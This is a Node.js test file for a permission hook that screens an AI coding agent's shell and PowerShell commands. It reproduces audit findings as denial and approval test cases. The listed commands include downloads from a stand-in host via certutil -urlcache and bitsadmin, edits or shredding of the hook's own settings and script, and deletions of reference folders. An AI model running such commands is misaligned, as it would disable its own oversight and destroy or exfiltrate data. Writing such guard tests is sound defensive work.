// Audit 2026-11-16, findings 9, 10, 13 and 14, each reproduced through the spawned hook before the fix:
// 9: a reference folder named as a whole (`rm -r templates`, `mv templates t2`, `git rm -r templates`) or reached after a `cd`
//    (`(cd templates && rm t.md)`) was not protected: the checks looked for the text `templates/` with its slash.
// 10: programs that write, replace or delete their operand and stood on no writer list (uniq IN OUT, yq -i, gzip, dos2unix,
//    ex, patch, shred, iconv -o, split, certutil -decode, the .NET file calls, Start-Transcript, icacls, attrib, git stash push
//    <pathspec>) reached guardrail paths, reference folders and guarded file types with no verdict.
// 13: deploy and publish commands the lists did not know (fab del/move/copy, `fab -c "..."`, pbi-tools.core, the FabricPS-PBIP
//    cmdlets, msbuild /t:Deploy, SSISDeploy), and a deploy script other than deploy*.ps1, which lab mode let run.
// 14: network transfers by certutil -urlcache and bitsadmin /transfer, and programs that open a URL (start, Start-Process,
//    explorer, xdg-open, open, rundll32 url.dll).
import { after, test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const HOOK = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'hooks', 'pre-tool-use.mjs');

/** A temporary project with the given files (the real path: a Windows short name would not be the project's spelling). */
function project(files) {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'bi-harness-writers-')));
  for (const [rel, text] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), text);
  }
  return dir;
}

// The project of the hooks: reference folders that exist (a `cd` into them can be placed), no .claude folder (as in the
// audit's project), and a config whose `references` adds setup/. Set before the modules read CLAUDE_PROJECT_DIR.
const dir = project({
  'templates/t.md': '# t\n', 'templates/x.yml': 'a: 1\n', 'templates/x.txt': 'x\n',
  'reports/r1/source/q.sql': 'SELECT 1\n', 'setup/x.txt': 'x\n',
  'docs/a.md': '# a\n', 'docs/b.md': '# b\n', 'docs/a.txt': 'a\n',
  'hardening/harness.config.json': `${JSON.stringify({ references: ['setup/'] }, null, 2)}\n`,
});
process.env.CLAUDE_PROJECT_DIR = dir;
const { analyzeShellCommand } = await import('../hooks/lib/policy.mjs');
after(() => fs.rmSync(dir, { recursive: true, force: true }));

/** The shell guard's verdict; `baseDir` is the shell's folder from the payload (the project when omitted). */
const verdict = (command, baseDir = dir) => analyzeShellCommand(command, { baseDir, references: ['setup/'] });
const REFERENCE = /reference folder/i;
const GUARDRAIL = /Harness guardrail files|Deleting harness or git metadata/;
const GUARDED_TYPE = /Edit or Write tool/;
const NETWORK = /exfiltration/;

function assertDeny(command, reason, baseDir = dir) {
  const v = verdict(command, baseDir);
  assert.equal(v?.decision, 'deny', `${command} (from ${path.relative(dir, baseDir) || 'the project'})`);
  assert.match(v.reason, reason, command);
}
/** The floor ask: auto approval never passes it and lab mode leaves it to the user. */
function assertFloor(command) {
  const v = verdict(command);
  assert.equal(v?.decision, 'ask', command);
  assert.equal(v.floor, true, command);
  assert.equal(v.autoApprovable, false, command);
}

/** The spawned hook's answer for one tool call in `root` (CLAUDE_PROJECT_DIR); `extra` adds payload fields such as cwd. */
function guard(root, tool_name, command, extra = {}) {
  const r = spawnSync(process.execPath, [HOOK], {
    input: JSON.stringify({ hook_event_name: 'PreToolUse', session_id: 'audit-writers', tool_name, tool_input: { command }, ...extra }),
    env: { ...process.env, CLAUDE_PROJECT_DIR: root },
    encoding: 'utf8',
  });
  assert.equal(r.status, 0, r.stderr);
  return r.stdout.trim() ? JSON.parse(r.stdout).hookSpecificOutput : {};
}

// ---------------------------------------------------------------- 9: a reference folder as a whole, or after a cd

test('9: a delete, move, rename or git change of a reference folder itself, or after a cd into one, is denied', () => {
  for (const command of [
    'rm -r templates', 'rm -r templates/', 'rmdir templates', 'rm -r TEMPLATES', 'rm -r ./templates', 'mv templates t2', 'mv docs/a.txt templates',
    'git mv templates t2', 'git checkout HEAD~1 -- templates', 'git checkout HEAD~1 templates/t.md', 'git restore -s HEAD~1 templates',
    'git restore --source=HEAD~1 -- reports/r1/source', 'git rm -r templates', 'git rm reports/r1/source/q.sql', 'git rm -r :/templates',
    'rm -r reports/r1/source', 'rm -r setup', 'mv setup s2',
    // PowerShell, its aliases and cmd.
    'Remove-Item templates -Recurse', 'rd templates -Recurse', 'Remove-Item -LiteralPath Templates', 'ren templates t2', 'rni templates t2',
    'mi templates t2', 'move templates t2', 'cmd /c ren templates t2', 'Remove-Item reports\\r1\\source -Recurse',
    // After a cd, pushd, Push-Location or Set-Location of the same command line.
    '(cd templates && rm t.md)', '(cd templates && echo x > t.txt)', '(cd reports/r1/source && rm q.sql)', '(cd reports/r1 && rm -r source)',
    '(cd reports/r1 && mv source src2)', 'pushd templates && rm t.md', 'cd setup && rm x.txt', 'cd docs && rm -r ../templates',
    'Push-Location templates; try { Remove-Item t.md } finally { Pop-Location }', 'Set-Location reports\\r1; Remove-Item source -Recurse',
    // Code that names the folder in a string.
    "[IO.Directory]::Delete('reports\\r1\\source',$true)", 'node -e "require(\'fs\').rmSync(\'templates\', { recursive: true })"',
  ]) {
    assertDeny(command, REFERENCE);
  }
  // From the shell's folder of the payload (baseDir), the folder itself by a relative name.
  for (const command of ['rm -r ../templates', 'mv ../templates ../t2', 'git rm -r ../templates']) assertDeny(command, REFERENCE, path.join(dir, 'docs'));
  for (const command of ['rm -r source', 'mv source src2', 'Remove-Item source -Recurse', 'git restore -s HEAD~1 source', 'tar -xf ../../a.tar -C source']) {
    assertDeny(command, REFERENCE, path.join(dir, 'reports', 'r1'));
  }
  // A screenshot written into a reference folder after a cd gets the verdict of the spelling without one: the reference write.
  const direct = verdict('powerbi-desktop screenshot --pid 1 --output templates/s.png');
  assert.equal(direct?.decision, 'deny');
  assert.match(direct.reason, REFERENCE);
  assert.deepEqual(verdict('cd docs && powerbi-desktop screenshot --pid 1 --output ../templates/s.png'), direct);
});

test('9: the hook denies a reference folder by its name, after a cd and from PowerShell; the config\'s references count', () => {
  for (const [tool, command] of [['Bash', 'rm -r templates'], ['Bash', '(cd reports/r1 && rm -r source)'], ['PowerShell', 'Remove-Item templates -Recurse'],
    ['PowerShell', 'Push-Location templates; try { Remove-Item t.md } finally { Pop-Location }'], ['Bash', 'git restore -s HEAD~1 templates'],
    ['Bash', 'rm -r setup']]) {
    const out = guard(dir, tool, command);
    assert.equal(out.permissionDecision, 'deny', `${tool}: ${command}`);
    assert.match(out.permissionDecisionReason, REFERENCE, command);
  }
  // The shell's folder from the payload: a session that moved into reports/r1/ or templates/.
  assert.equal(guard(dir, 'Bash', 'rm -r source', { cwd: path.join(dir, 'reports', 'r1') }).permissionDecision, 'deny');
  assert.equal(guard(dir, 'Bash', 'rm t.md', { cwd: path.join(dir, 'templates') }).permissionDecision, 'deny');
});

// ---------------------------------------------------------------- 10: writers that stood on no list

test('10: programs that write, replace or delete their operand are denied on a guardrail path', () => {
  for (const command of [
    'uniq docs/a.md .claude/settings.local.json', "yq -i 'del(.hooks)' .claude/settings.local.json", 'gzip hardening/hooks/pre-tool-use.mjs',
    'gunzip hardening/x.gz', 'bzip2 hardening/hooks/pre-tool-use.mjs', 'xz hardening/hooks/pre-tool-use.mjs', 'dos2unix hardening/hooks/pre-tool-use.mjs',
    'unix2dos hardening/hooks/pre-tool-use.mjs', "ex -sc '%d|x' hardening/hooks/pre-tool-use.mjs", "vim -es -c '%d|x' hardening/hooks/pre-tool-use.mjs",
    'ed -s hardening/hooks/pre-tool-use.mjs', 'patch .claude/settings.local.json x.diff', 'shred -u hardening/hooks/pre-tool-use.mjs',
    'iconv -f utf-8 -t ascii -o .claude/settings.local.json docs/a.txt', 'iconv -f utf-8 -t ascii --output=hardening/x.mjs docs/a.txt',
    'split -l 1 docs/a.txt hardening/hooks/x', 'certutil -encode docs/a.txt hardening/hooks/pre-tool-use.mjs', 'certutil -decode x.b64 .claude/settings.local.json',
    "[IO.File]::Delete('.claude\\settings.local.json')", "[IO.Directory]::Delete('hardening',$true)", "[System.IO.File]::Move('docs\\a.txt','.claude\\settings.local.json')",
    '(Get-Item hardening\\hooks\\pre-tool-use.mjs).Delete()', 'Start-Transcript .claude\\settings.local.json', 'Start-Transcript -Path hardening\\x.log',
    'Set-ItemProperty hardening\\hooks\\pre-tool-use.mjs IsReadOnly $true', 'icacls hardening /deny Everyone:R', 'attrib +h .claude\\settings.local.json',
    'git stash push hardening', 'git stash push -- .claude', 'git stash -- .claude', 'git stash push -m x -- hardening/hooks', 'git stash push -k .github',
    '(cd .claude && sort --outp=settings.local.json ../docs/b.md)', '(cd .claude && uniq ../docs/b.md settings.local.json)',
  ]) {
    assertDeny(command, GUARDRAIL);
  }
  assertDeny('npm --prefix hardening pkg set scripts.test=true', /package\.json/);
});

test('10: the same programs are denied on a reference folder and on a guarded file type', () => {
  for (const command of [
    'gzip templates/t.md', 'dos2unix templates/t.md', 'sort -o templates/t.md docs/a.md', 'uniq docs/a.md templates/x.txt', "yq -i '.a = 1' templates/x.yml",
    'Start-Transcript -Path templates\\t.txt', "[IO.File]::Delete('templates\\t.md')", "[IO.Directory]::Delete('templates',$true)", '(Get-Item templates\\t.md).Delete()',
    'Compress-Archive docs templates\\d.zip', 'Compress-Archive -Path docs -DestinationPath templates\\d.zip', 'Expand-Archive a.zip -DestinationPath templates',
    'tar -xf a.tar -C templates', 'tar xf a.tar --directory=templates', 'tar -cf templates/x.tar docs', 'unzip a.zip -d templates', '7z x a.7z -otemplates',
    'ln -sf ../docs/a.md templates/t.md', 'chmod 000 templates/t.md', 'patch templates/x.txt x.diff', 'certutil -decode x.b64 templates/x.txt',
    'iconv -f a -t b -o templates/x.txt docs/a.txt', 'split -l 1 docs/a.txt templates/x', 'rsync -a --delete docs/ templates/', 'robocopy docs templates',
    'git stash push templates', 'git stash push -- reports/r1/source', 'unix2dos setup/x.txt', 'shred -u templates/x.txt',
  ]) {
    assertDeny(command, REFERENCE);
  }
  for (const command of ['gzip docs/a.md', 'dos2unix docs/a.md', 'uniq docs/a.txt docs/b.md', 'patch docs/a.md x.diff', 'certutil -decode x.b64 docs/a.md',
    'Start-Transcript docs\\a.md', 'iconv -f a -t b -o docs/a.md docs/a.txt', 'shred reports/r1/q.sql']) {
    assertDeny(command, GUARDED_TYPE);
  }
});

test('10: the hook denies the writers on a guardrail path and a reference folder', () => {
  for (const [tool, command] of [['Bash', 'gzip hardening/hooks/pre-tool-use.mjs'], ['Bash', "yq -i 'del(.hooks)' .claude/settings.local.json"],
    ['PowerShell', "[IO.File]::Delete('.claude\\settings.local.json')"], ['Bash', 'git stash push -- .claude'], ['Bash', 'uniq docs/a.md templates/x.txt'],
    ['PowerShell', 'Expand-Archive a.zip -DestinationPath templates']]) {
    assert.equal(guard(dir, tool, command).permissionDecision, 'deny', `${tool}: ${command}`);
  }
});

// ---------------------------------------------------------------- 13: deploy and publish commands

test('13: deploy and publish commands the lists did not know get the floor ask fab deploy gets', () => {
  const fabDeploy = verdict('fab deploy x');
  for (const command of [
    'fab del ws.Workspace/x.Report -f', 'fab move a b', 'fab copy a b', 'fab mklink x y', 'fab table load ws.Workspace/l.Lakehouse/Tables/t --file x.csv',
    'fab -c "rm ws.Workspace/x.Report -f"', 'fab -c "import ws.Workspace/x.Report -i ./R.Report -f"', 'fab --command "rm ws.Workspace/x.Report -f"',
    'fab -c="del ws.Workspace/x.Report -f"', 'pbi-tools.core deploy . Prod', 'pbi-tools.core.exe deploy . Prod', 'Import-FabricItems -workspaceId x -path .',
    'Import-FabricItem -workspaceId x -path R.Report', 'Invoke-FabricAPIRequest -uri workspaces -method Post', 'Set-FabricAuthToken',
    'Invoke-AzRestMethod -Uri https://example.invalid/v1/workspaces -Method POST', 'msbuild R.rptproj /t:Deploy', 'msbuild R.rptproj -t:Deploy',
    'dotnet msbuild R.rptproj /target:Deploy', 'msbuild R.rptproj "/t:Build;Deploy"', 'MSBuild.exe R.rptproj /t:deploy', 'devenv R.sln /Deploy Release',
    'SSISDeploy.exe -s:a.ispac -d:catalog;/SSISDB/x/y;srv',
  ]) {
    assert.deepEqual(verdict(command), fabDeploy, command);
  }
});

test('13: a deploy script of any script type and a task runner\'s deploy target are the floor ask', () => {
  for (const command of ['bash deploy.sh', './deploy.sh', 'sh ./deploy-prod.bash', 'python deploy.py', 'deploy.cmd', '.\\Deploy.bat', 'cmd /c deploy.bat',
    'node scripts/deploy-model.mjs', 'node deploy.js', 'npx tsx deploy.ts', 'pwsh ./deploy.ps1', 'npm run deploy', 'npm run deploy:prod',
    'npm --prefix app run-script deploy', 'pnpm run deploy', 'yarn deploy', 'yarn run deploy-prod', 'make deploy', 'make -C infra deploy-prod', 'just deploy']) {
    assertFloor(command);
  }
});

test('13: lab mode leaves a deploy script and a deploy target to the user; an ordinary script still runs', () => {
  const lab = project({ 'hardening/harness.config.json': `${JSON.stringify({ approvals: { mode: 'lab' } }, null, 2)}\n` });
  try {
    for (const [tool, command] of [['Bash', 'bash deploy.sh'], ['Bash', './deploy.sh'], ['Bash', 'python deploy.py'], ['PowerShell', 'deploy.cmd'],
      ['PowerShell', '.\\Deploy.bat'], ['Bash', 'npm run deploy'], ['Bash', 'make deploy'], ['Bash', 'fab del ws.Workspace/x.Report -f'],
      ['PowerShell', 'pwsh ./deploy.ps1']]) {
      assert.equal(guard(lab, tool, command).permissionDecision, 'ask', `${tool}: ${command}`);
    }
    assert.equal(guard(lab, 'Bash', 'python tools/build.py').permissionDecision, 'allow'); // lab passes an ordinary script run
  } finally {
    fs.rmSync(lab, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------- 14: network transfers and URLs

test('14: certutil -urlcache, bitsadmin /transfer and a program that opens a URL are denied as network egress', () => {
  for (const command of [
    'certutil -urlcache -f https://example.invalid/x x.bin', 'certutil /urlcache /f https://example.invalid/x x.bin',
    'CertUtil.exe -URLCache -split -f https://example.invalid/x x.bin', 'bitsadmin /transfer j https://example.invalid/x x.bin',
    'bitsadmin /addfile j https://example.invalid/x x.bin', 'BITSADMIN -Transfer j https://example.invalid/x x.bin',
    'start https://example.invalid/?q=x', 'start "" https://example.invalid/', 'start ftp://example.invalid/x', 'explorer https://example.invalid/?q=x',
    'explorer.exe "https://example.invalid/?q=x"', 'Start-Process https://example.invalid/?q=x', 'saps https://example.invalid/',
    'Start-Process -FilePath https://example.invalid/', 'cmd /c start https://example.invalid/?q=x', 'cmd /c "start https://example.invalid/?q=x"',
    'rundll32 url.dll,FileProtocolHandler https://example.invalid/?q=x', 'xdg-open https://example.invalid/?q=x', 'open http://example.invalid/?q=x',
    'Invoke-Item https://example.invalid/', 'ii https://example.invalid/',
  ]) {
    assertDeny(command, NETWORK);
  }
});

test('14: the hook denies certutil -urlcache and a URL opened by Start-Process or xdg-open', () => {
  for (const [tool, command] of [['PowerShell', 'certutil -urlcache -f https://example.invalid/x x.bin'], ['PowerShell', 'Start-Process https://example.invalid/?q=x'],
    ['Bash', 'xdg-open https://example.invalid/?q=x']]) {
    const out = guard(dir, tool, command);
    assert.equal(out.permissionDecision, 'deny', `${tool}: ${command}`);
    assert.match(out.permissionDecisionReason, NETWORK, command);
  }
});

// ---------------------------------------------------------------- what the fix leaves alone (passes before and after)

test('must stay: reads, copies out of a reference folder, ordinary writers, text and the denials of today', () => {
  for (const command of [
    'ls templates', 'cat templates/t.md', 'cp -r templates docs/t2', 'tar -cf docs/t.tar templates', 'Compress-Archive templates docs\\t.zip',
    'robocopy templates docs\\t2', 'git diff -- templates', 'git log -- templates', 'git status templates', 'git restore --staged templates', 'rm notes.txt',
    'mv a.txt b.txt', 'gzip notes.txt', 'dos2unix notes.txt', 'uniq docs/a.md', 'certutil -hashfile x.bin SHA256', 'Start-Process notepad',
    "Start-Process git -ArgumentList 'status'", 'explorer .', 'start .', 'fab ls', 'Get-PowerBIReport', 'msbuild R.rptproj /t:Build', 'npm run build',
    'make test', 'make -j4', 'echo https://example.com', 'echo npm run deploy', 'git commit -m "docs: fab del and msbuild /t:Deploy, see https://example.com"',
    'grep -n "certutil -urlcache" docs/a.md', 'git stash', 'git stash push -m x', 'git stash push -m "hardening wip"',
    // Naming the folder is no write: a copy out of it to a variable, a listing or a log into a variable's file.
    'cp -r templates $dest', 'ls templates > $f', 'git log -- templates > $f',
  ]) {
    assert.equal(verdict(command), null, command);
  }
  assert.equal(verdict('ls', path.join(dir, 'templates')), null); // looking around inside a reference folder
  // An ordinary script run keeps its own ask (never the floor).
  const script = verdict('python tools/build.py');
  assert.equal(script?.decision, 'ask');
  assert.notEqual(script.floor, true);
  assert.equal(script.autoDefer, true);
  // Copying a Markdown file out with cp was denied before the fix (cp's words are judged as written, sources included): kept.
  assertDeny('cp templates/t.md docs/x.txt', GUARDED_TYPE);
  // The denials of today keep their decision.
  for (const command of ['rm templates/t.md', 'cp docs/a.md templates/', 'touch templates/new.txt', 'del templates\\t.md', 'truncate -s 0 templates/t.md',
    'dd if=docs/a.txt of=templates/t.md', 'tee templates/t.md', 'Set-Content templates\\t.md x', 'Get-Process | Export-Csv templates\\x.csv',
    'sort -o templates/t.md docs/a.md']) {
    assertDeny(command, REFERENCE);
  }
  for (const command of ['(cd .claude && rm settings.local.json)', 'mv .claude c2', 'ren hardening h2', 'cp docs/a.md .claude/settings.local.json']) {
    assertDeny(command, GUARDRAIL);
  }
  assert.deepEqual(verdict('git stash drop'), { decision: 'deny', reason: 'git stash drop/clear loses stashed work.' });
});
